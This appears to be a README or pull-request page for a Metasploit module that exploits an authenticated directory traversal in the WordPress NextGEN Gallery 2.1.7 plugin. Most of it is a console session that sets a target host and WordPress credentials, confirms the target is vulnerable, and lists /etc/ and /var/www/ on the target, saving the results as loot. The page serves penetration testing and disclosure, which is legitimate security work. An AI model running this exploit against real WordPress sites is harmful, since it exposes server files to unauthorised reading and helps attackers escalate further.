#### Add WordPress Plugin NextGEN Gallery Auth Directory Traversal Vulnerability.

  Application: WordPress Plugin 'NextGEN Galley' 2.1.7</br>
  Homepage: https://wordpress.org/plugins/nextgen-gallery/</br>
  Source Code: https://downloads.wordpress.org/plugin/nextgen-gallery.2.1.7.zip</br>
  Active Installs (wordpress.org): 1 Million+</br>
  References: https://wpvulndb.com/vulnerabilities/8165

#### Vulnerable packages*
        
  2.1.7

#### Module

[wp_nextgen_gallery_dir_read.rb](https://github.com/espreto/wpsploit/blob/master/modules/auxiliary/scanner/http/wordpress/wp_nextgen_galley_file_read.rb)
  
#### Usage:

##### Linux (Ubuntu 12.04.5 LTS):
```
msfdevel msf>  use auxiliary/scanner/http/wp_nextgen_galley_file_read 
msfdevel msf> auxiliary(wp_nextgen_galley_file_read)  show options 

Module options (auxiliary/scanner/http/wp_nextgen_galley_file_read):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DEPTH      7                yes       Traversal Depth (to reach the root folder)
   DIRPATH    /etc/            yes       The path to the directory to read
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target address range or CIDR identifier
   RPORT      80               yes       The target port
   TARGETURI  /                yes       The base path to the wordpress application
   THREADS    1                yes       The number of concurrent threads
   VHOST                       no        HTTP server virtual host
   WP_PASS                     yes       Valid password for the provided username
   WP_USER                     yes       A valid username

msfdevel msf> auxiliary(wp_nextgen_galley_file_read)  info 

       Name: WordPress NextGEN Gallery Directory Read Vulnerability
     Module: auxiliary/scanner/http/wp_nextgen_galley_file_read
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  Sathish Kumar
  Roberto Soares Espreto <robertoespreto@gmail.com>

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  DEPTH      7                yes       Traversal Depth (to reach the root folder)
  DIRPATH    /etc/            yes       The path to the directory to read
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                      yes       The target address range or CIDR identifier
  RPORT      80               yes       The target port
  TARGETURI  /                yes       The base path to the wordpress application
  THREADS    1                yes       The number of concurrent threads
  VHOST                       no        HTTP server virtual host
  WP_PASS                     yes       Valid password for the provided username
  WP_USER                     yes       A valid username

Description:
  This module exploits an authenticated directory traversal 
  vulnerability in WordPress Plugin "NextGEN Gallery" version 2.1.7, 
  allowing to read arbitrary directories with the web server 
  privileges.

References:
  https://wpvulndb.com/vulnerabilities/8165
  http://permalink.gmane.org/gmane.comp.security.oss.general/17650

msfdevel msf> auxiliary(wp_nextgen_galley_file_read)  set RHOSTS 192.168.1.63
RHOSTS => 192.168.1.63
msfdevel msf> auxiliary(wp_nextgen_galley_file_read)  set WP_USER espreto
WP_USER => espreto
msfdevel msf> auxiliary(wp_nextgen_galley_file_read)  set WP_PASS R@x0rP@55
WP_PASS => R@x0rP@55
msfdevel msf> auxiliary(wp_nextgen_galley_file_read)  check
[*] 192.168.1.63:80 - The target appears to be vulnerable.
[*] Checked 1 of 1 hosts (100% complete)
msfdevel msf> auxiliary(wp_nextgen_galley_file_read)  run

[+] 192.168.1.63:80 - File saved in: /home/espreto/.msf4/loot/20150901235949_default_192.168.1.63_nextgen.traversa_297638.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msfdevel msf> auxiliary(wp_nextgen_galley_file_read)  head /home/espreto/.msf4/loot/20150901235949_default_192.168.1.63_nextgen.traversa_297638.txt
[*] exec: head /home/espreto/.msf4/loot/20150901235949_default_192.168.1.63_nextgen.traversa_297638.txt

/etc/.java
/etc/acpi
/etc/alternatives
/etc/apache2
/etc/apm
/etc/apparmor
/etc/apparmor.d
/etc/apport
/etc/apt
/etc/at-spi2
msfdevel msf> auxiliary(wp_nextgen_galley_file_read)  set VERBOSE true
VERBOSE => true
msfdevel msf> auxiliary(wp_nextgen_galley_file_read)  run

[*] 192.168.1.63:80 - Trying to login as: espreto
[*] 192.168.1.63:80 - Trying to get nonce...
[*] 192.168.1.63:80 - Got nonce: 7b34abbb11
/etc/.java
/etc/acpi
/etc/alternatives
/etc/apache2
/etc/apm
/etc/apparmor
/etc/apparmor.d
/etc/apport
/etc/apt
/etc/at-spi2
/etc/avahi
/etc/bash_completion.d
/etc/bluetooth
/etc/bonobo-activation
/etc/brltty
/etc/ca-certificates
/etc/calendar
/etc/chatscripts
/etc/checkbox.d
/etc/compizconfig
/etc/console-setup
/etc/ConsoleKit
/etc/cron.d
/etc/cron.daily
/etc/cron.hourly
/etc/cron.monthly
/etc/cron.weekly
/etc/cups
/etc/cupshelpers
/etc/dbconfig-common
/etc/dbus-1
/etc/default
/etc/depmod.d
/etc/dhcp
/etc/dictionaries-common
/etc/dkms
/etc/doc-base
/etc/dpkg
/etc/elasticsearch
/etc/emacs
/etc/firefox
/etc/fonts
/etc/foomatic
/etc/fstab.d
/etc/gconf
/etc/gdb
/etc/ghostscript
/etc/ginn
/etc/gnome
/etc/gnome-app-install
/etc/gnome-settings-daemon
/etc/gnome-vfs-2.0
/etc/goahead
/etc/groff
/etc/grub.d
/etc/gtk-2.0
/etc/gtk-3.0
/etc/hp
/etc/ifplugd
/etc/init
/etc/init.d
/etc/initramfs-tools
/etc/insserv
/etc/insserv.conf.d
/etc/iproute2
/etc/java-7-openjdk
/etc/kbd
/etc/kernel
/etc/ld.so.conf.d
/etc/ldap
/etc/libnl-3
/etc/libpaper.d
/etc/libreoffice
/etc/lightdm
/etc/logcheck
/etc/logrotate.d
/etc/logstash
/etc/lsb-base
/etc/modprobe.d
/etc/mysql
/etc/network
/etc/NetworkManager
/etc/newt
/etc/obex-data-server
/etc/opt
/etc/pam.d
/etc/pcmcia
/etc/pear
/etc/perl
/etc/php5
/etc/pkcs11
/etc/pm
/etc/polkit-1
/etc/postgresql
/etc/postgresql-common
/etc/ppp
/etc/profile.d
/etc/pulse
/etc/python
/etc/python2.7
/etc/rc0.d
/etc/rc1.d
/etc/rc2.d
/etc/rc3.d
/etc/rc4.d
/etc/rc5.d
/etc/rc6.d
/etc/rcS.d
/etc/resolvconf
/etc/rsyslog.d
/etc/sane.d
/etc/security
/etc/sensors.d
/etc/sgml
/etc/skel
/etc/snmp
/etc/sound
/etc/speech-dispatcher
/etc/ssh
/etc/ssl
/etc/sudoers.d
/etc/sysctl.d
/etc/systemd
/etc/terminfo
/etc/thunderbird
/etc/udev
/etc/ufw
/etc/update-manager
/etc/update-motd.d
/etc/update-notifier
/etc/UPower
/etc/usb_modeswitch.d
/etc/vim
/etc/wireshark
/etc/wpa_supplicant
/etc/X11
/etc/xdg
/etc/xml
/etc/xul-ext
[+] 192.168.1.63:80 - File saved in: /home/espreto/.msf4/loot/20150902000008_default_192.168.1.63_nextgen.traversa_068112.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msfdevel msf> auxiliary(wp_nextgen_galley_file_read)  set DIRPATH /var/www/
DIRPATH => /var/www/
msfdevel msf> auxiliary(wp_nextgen_galley_file_read)  run

[*] 192.168.1.63:80 - Trying to login as: espreto
[*] 192.168.1.63:80 - Trying to get nonce...
[*] 192.168.1.63:80 - Got nonce: 98f88204b1
/var/www/html
/var/www/logs
/var/www/simple-backup
/var/www/wp-admin
/var/www/wp-content
/var/www/wp-includes
[+] 192.168.1.63:80 - File saved in: /home/espreto/.msf4/loot/20150902000017_default_192.168.1.63_nextgen.traversa_976779.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msfdevel msf> auxiliary(wp_nextgen_galley_file_read)
```
